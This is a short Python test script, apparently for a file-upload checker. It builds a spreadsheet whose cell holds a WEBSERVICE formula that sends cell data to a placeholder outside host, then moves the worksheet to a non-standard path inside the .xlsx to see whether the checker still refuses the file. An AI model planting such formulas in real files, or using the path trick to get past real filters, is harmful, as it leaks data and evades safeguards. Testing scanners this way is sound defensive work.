"""PROD-1, independently: an .xlsx whose worksheet lives at a non-standard path, found through its relationship."""
import io, re, zipfile
import openpyxl
from app.products import checks

wb = openpyxl.Workbook()
wb.active["A1"] = "id"
wb.active["B1"] = '=WEBSERVICE("https://example.invalid/?"&A1)'
buf = io.BytesIO(); wb.save(buf)
src = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
out = io.BytesIO()
with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
    for info in src.infolist():
        data = src.read(info.filename)
        name = info.filename
        if name == "xl/worksheets/sheet1.xml":
            name = "xl/tabs/t1.xml"
        if name in ("xl/_rels/workbook.xml.rels", "[Content_Types].xml"):
            data = data.replace(b"worksheets/sheet1.xml", b"tabs/t1.xml")
        z.writestr(name, data)
moved = out.getvalue()
for label, blob in (("standard path", buf.getvalue()), ("moved to xl/tabs/t1.xml", moved)):
    try:
        checks.check("budget.xlsx", blob); verdict = "KEPT"
    except checks.Refused as exc:
        verdict = f"REFUSED ({str(exc)[:70]})"
    print(f"{label:26s} -> {verdict}")
back = openpyxl.load_workbook(io.BytesIO(moved))
print("openpyxl reads the moved sheet's B1:", back.active["B1"].value)
